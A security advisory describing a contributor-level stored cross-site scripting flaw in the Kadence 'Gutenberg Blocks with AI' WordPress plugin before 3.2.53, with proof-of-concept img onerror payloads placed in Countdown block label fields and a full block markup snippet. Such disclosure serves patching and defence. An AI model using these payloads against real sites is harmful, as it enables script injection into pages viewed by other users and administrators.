## WordPress Plugin Vulnerabilities

# Gutenberg Blocks with AI by Kadence WP < 3.2.53 - Contributor+ Stored XSS

### Description

The plugin does not validate and escape some of its block options before outputting them back in a page/post where the block is embed, which could allow users with the contributor role and above to perform Stored Cross-Site Scripting attacks

### Proof of Concept

As a contributor, add a Countdown block widget to a post and put the following payload in the Days/Hours/Minutes or Seconds Label field (in the Countdown layout section of the block settings): "&amp;lt;img src=x onerror=alert(/XSS/)&amp;gt;"
Or put the code below in a post while in code editor mode:
<!-- wp:kadence/countdown {"uniqueID":"82\_790636-a6","date":"2024-09-08T13:12:44.675Z","timestamp":1725808364675,"timeOffset":0,"daysLabel":"\u0026lt;img src=x onerror=alert(/XSS-days/)\u0026gt;","hoursLabel":"\u0026lt;img src=x onerror=alert(/XSS-hours/)\u0026gt;","minutesLabel":"\u0026lt;img src=x onerror=alert(/XSS-minutes/)\u0026gt;","secondsLabel":"\u0026lt;img src=x onerror=alert(/XSS-seconds/)\u0026gt;"} -->
<div class="wp-block-kadence-countdown kb-countdown-container kb-countdown-container-82\_790636-a6 kb-countdown-timer-layout-block kb-countdown-has-timer" data-id="82\_790636-a6"><!-- wp:kadence/countdown-timer {"uniqueID":"82\_db1512-a2"} -->
<div class="wp-block-kadence-countdown-timer kb-countdown-timer-82\_db1512-a2 kb-countdown-timer"><div class="kb-countdown-item kb-countdown-date-item"><span class="kb-countdown-number"> </span><span class="kb-countdown-label"> </span></div></div>
<!-- /wp:kadence/countdown-timer --></div>
<!-- /wp:kadence/countdown -->
Save/submit for review, the XSS will be triggered when (pre)viewing the post
